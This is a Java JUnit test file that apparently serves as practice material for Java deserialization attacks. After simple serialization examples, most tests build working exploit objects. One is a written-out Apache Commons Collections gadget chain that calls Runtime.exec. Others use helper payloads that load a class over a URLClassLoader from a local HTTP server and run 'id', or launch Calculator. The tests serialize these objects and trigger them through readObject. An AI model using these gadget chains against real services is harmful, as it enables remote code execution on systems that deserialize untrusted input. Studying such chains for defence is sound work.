package serialization;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.FileInputStream;
import java.io.ObjectOutputStream;
import java.io.FileOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.junit.Test;

import payload.PayloadGeneration;

import sun.reflect.annotation.*;

import rmi.model.PersonEntity;
import until.ObjectToBase64;

public class SerializeTest {

    public static void main(String args[]) throws Exception {
        //This is the object we're going to serialize.
        String name = "bob";

        //We'll write the serialized data to a file "name.ser"
        FileOutputStream fos = new FileOutputStream("name.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(name);
        os.close();

        //Read the serialized data back in from the file "name.ser"
        FileInputStream fis = new FileInputStream("name.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);

        //Read the object from the data stream, and convert it back to a String
        String nameFromDisk = (String) ois.readObject();

        //Print the result.
        System.out.println(nameFromDisk);
        ois.close();

    }

    @Test
    public void serializationTest() throws IOException, ClassNotFoundException {
        //This is the object we're going to serialize.
        PersonEntity person1 = new PersonEntity();
        person1.setAge(25);
        person1.setId(0);
        person1.setName("Leslie");

        //We'll write the serialized data to a file "object.ser"
        FileOutputStream fos = new FileOutputStream("object.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(person1);
        os.close();

        //Read the serialized data back in from the file "object.ser"
        FileInputStream fis = new FileInputStream("object.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);

        //Read the object from the data stream, and convert it back to a String
        PersonEntity objectFromDisk = (PersonEntity) ois.readObject();

        //Print the result.
        System.out.println("ID:" + objectFromDisk.getId() + " Age:" + objectFromDisk.getAge() + " Name:" + objectFromDisk.getName());
        ois.close();
    }

    @Test
    public void payloadTest() {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",      //方法名
                        new Class[]{String.class, Class[].class},  //参数类型
                        new Object[]{"getRuntime", new Class[0]}), //参数值
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        Map inMap = new HashMap();
        inMap.put("key", "value");
        Map outMap = TransformedMap.decorate(inMap, null, chainedTransformer);


        for (Iterator iterator = outMap.entrySet().iterator(); iterator.hasNext(); ) {
            Map.Entry entry = (Entry) iterator.next();
            entry.setValue("123");
        }
    }

    @Test
    public void exploitURLClassLoaderTest() throws Exception {
        Object exploitObject = PayloadGeneration.generateURLClassLoaderPayload("http://127.0.0.1:8999/", "ErrorBaseExec", "do_exec", "id");
        String exploitBase64String = ObjectToBase64.toBase64(exploitObject);
        System.out.println(exploitBase64String);

        //We'll write the serialized data to a file "exploitObject.ser"
        FileOutputStream fos = new FileOutputStream("exploitURLClassLoaderObject.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(exploitObject);
        os.close();

        //Read the serialized data back in from the file "exploitObject.ser"
        FileInputStream fis = new FileInputStream("exploitURLClassLoaderObject.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);

        //Read the object from the data stream
        PersonEntity objectFromDisk = (PersonEntity) ois.readObject();

        ois.close();
    }

    @Test
    public void exploitTest() throws Exception {
        Object exploitObject = PayloadGeneration.generateExecPayload("/Applications/Calculator.app/Contents/MacOS/Calculator");

        //We'll write the serialized data to a file "exploitObject.ser"
        FileOutputStream fos = new FileOutputStream("exploitObject.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(exploitObject);
        os.close();

        //Read the serialized data back in from the file "exploitObject.ser"
        FileInputStream fis = new FileInputStream("exploitObject.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);

        //Read the object from the data stream
        PersonEntity objectFromDisk = (PersonEntity) ois.readObject();

        ois.close();
    }

    @Test
    public void paloadLazyMapTest() throws IllegalArgumentException, InstantiationException, IllegalAccessException, InvocationTargetException, Exception {
        //Object exploitObjectLazyMap = payloadLazyMapGeneration();

        Object exploitObjectLazyMap = PayloadGeneration.generateLazyMapExecPayload("calc");

        //We'll write the serialized data to a file "exploitObject.ser"
        FileOutputStream fos = new FileOutputStream("exploitObjectLazyMap.ser");
        ObjectOutputStream os = new ObjectOutputStream(fos);
        os.writeObject(exploitObjectLazyMap);
        os.close();

        //Read the serialized data back in from the file "exploitObject.ser"
        FileInputStream fis = new FileInputStream("exploitObjectLazyMap.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);

        //Read the object from the data stream
        PersonEntity objectFromDisk = (PersonEntity) ois.readObject();

        ois.close();

    }

    @Test
    public void dynamicProxyTest() {
        List list = new ArrayList();
        list.add("123");

        ListProxy listProxy = new ListProxy(list);

        List proxy = List.class.cast(Proxy.newProxyInstance(list.getClass().getClassLoader(), list.getClass().getInterfaces(), listProxy));
        //System.out.println(mapProxy.size());
        proxy.add("1");
        for (Iterator iterator = proxy.iterator(); iterator.hasNext(); ) {
            System.out.println(iterator.next());
        }

        System.out.println(proxy.size());


    }

    class ListProxy implements InvocationHandler {
        public List realList;//proxy the list object.

        public ListProxy(List _realList) {
            this.realList = _realList;
        }

        public Object invoke(Object proxy, Method method, Object[] args)
                throws Throwable {
            // TODO Auto-generated method stub
            //@param Object: is this(serializeTest) instance, but not needed
            if ("size".equals(method.getName())) {
                throw new UnsupportedOperationException();
            } else {
                return method.invoke(realList, args);
            }
        }

    }

}


